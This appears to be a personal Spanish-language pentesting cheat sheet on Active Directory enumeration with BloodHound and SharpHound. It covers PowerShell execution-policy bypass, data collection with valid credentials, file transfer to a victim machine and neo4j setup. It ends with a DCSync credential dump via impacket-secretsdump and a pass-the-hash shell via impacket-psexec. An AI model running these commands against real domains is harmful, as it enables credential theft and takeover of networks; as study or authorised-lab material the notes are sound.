# BloodHound 

Tags: #AD #Powershell #Windows #Enumeracion #BloodHound 

Bloodhound es una app en JavaScript la cual puede identificar fácilmente ataques altamente complejo que de otro modo seria imposible identificar ademas puede identificar grupos con permisos excesivos. Los defensores pueden usar Bloohound para identificar y eliminar esas mismas rutas de ataque. 

## SharpHound

```bash 
# Descargamos la utilidad en nuestra maquina de atacante para despues pasar el archivo a la maquina victima que esta utilizando PowerShell

❯ wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1 
```

```powershell 
# En la maquina victima con PS. Hacemos lo siguiente para la recoleccion de data

❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 

# Enumeracion 
❯ . .\SharpHound.ps1                         # Importamos el modulo 
❯ Import-Module .\SharpHound.ps1             # Otra forma de importar el modulo  

❯ Invoke-Bloodhound -CollectionMethod All    # Utilizamnos la funcion 'Invoke' para crear el archivo  '2024_bloodhound.zip' el cual usaremos en el GUI de la herramienta de Boolhound
```

## Subir Data por Python a BloodHound

```bash
❯ bloodhound-python -d Domain.local -u User -p Password -ns IP_DC -c all   # Ejecutamos para recopilar la data y asi poder subir el archivo a la plataforma de Bloodhound

Nota: Importamos todos los archivos que fueron generados en formato 'Json'
```

## SharpHound con credenciales Validas desde un CMD en Windows 

```bash 
# Autenticarse en un 'CMD' en Windows con credenciales validas
❯ runas /netonly /user:domain1.com\username cmd    # Autenticarse con credenciales validas a nivel de red en una CMD en Windows> Este comando abrirá una nueva CMD con las credenciales 

❯ dir \\IP\DIR           # Enumerar el directorio con el usuario autenticado desde una CMD en Windows 

❯ .\SharpHound.exe -c all -d domain1.com --domaincontroller IP   # Enumeración con SharpHound a un dominio con credenciales validas desde una CMD en Windows.
Nota: La herramienta regresará un archivo '.zip' que se debe cargar en 'BloodHound' para analizar

❯ python3 -m http.server 80     # Crear un recurso compartido a nivel de red para pasar archivos 
```

## BloodHound 

* [BloodHound](https://github.com/SpecterOps/BloodHound-Legacy/releases)
* [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries)
* [Neo4j-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/)

```bash 
❯ neo4j console &> /dev/null & disown      # Iniciamos el servicio en el puerto local '7474' y lo independizamos

Nota: Si es la primera vez que lo usamos, abrimos la web 'localhost:7474' y agregamos las credenciales 'neo4j:neo4j', despues, agregamos una passwd nueva y asi podremos conectarnos al 'Bloodhound'


❯ ./BloodHound --no-sandbox             # Ejecutar como usuario 'root' 
❯ bloodhound &> /dev/null & disown      # Ejecutar 'Bloodhound' e independizarlo

Nota:
	1. Para subir info de un archivo '.zip' se debe usar 'Upload Data'
	2. Para subir info de archivos 'Json' se debe usar 'Import Graph'
```

## Ataques 'DCSync'

```bash 
# Si encontramos en 'Bloodhound' un usuario que tiene un 'GetChangesAll' sobre el dominio podremos hacer un 'DCSync attack' para obtener el hash del usuario 'Administrador' y por lo tanto efectuar un 'Pass-The-Hash'

❯ impacket-secretsdump <Domain/User@IP>    # Hacemos un ataque 'DCSync', debemos de colocar la passwd del usuario 
❯ impacket-psexec <Domain/Administrator@IP> cmd.exe -hashes <:hash>   # Utilizamos 'psexec' para obtener una consola interactiva autenticandonos como el usuario 'Administrator' y colocando su hash para hacer 'Pass-The-Hash'    
```